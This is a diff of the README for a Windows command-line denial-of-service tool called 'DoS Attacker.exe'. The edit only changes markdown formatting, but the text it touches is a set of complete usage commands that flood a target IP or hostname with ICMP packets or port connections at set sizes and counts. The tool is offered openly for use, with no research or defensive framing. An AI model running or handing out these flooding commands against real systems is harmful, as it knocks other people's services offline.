@@ -13,15 +13,15 @@ A simple cmd DoS Attacker for Windows.
 
 **Usgae Examples:**  
 ~~~
-*"DoS Attacker.exe" 10.100.102.1 /icmp 8192 100 0*  
+"DoS Attacker.exe" 10.100.102.1 /icmp 8192 100 0
 
-*"DoS Attacker.exe" www.example.com /icmp 65536 100 0*  
+"DoS Attacker.exe" www.example.com /icmp 65536 100 0
 
-*"DoS Attacker.exe" 10.100.102.1 /port 80 8195 1000 0*
+"DoS Attacker.exe" 10.100.102.1 /port 80 8195 1000 0
 
-*"DoS Attacker.exe" 10.100.102.1 /port http 8195 50 0*
+"DoS Attacker.exe" 10.100.102.1 /port http 8195 50 0
 
-*"DoS Attacker.exe" www.example.com /port http 32 4096 0*
+"DoS Attacker.exe" www.example.com /port http 32 4096 0
 ~~~
 ## How it works:
 The program connects to the server, using the mode you chose.  
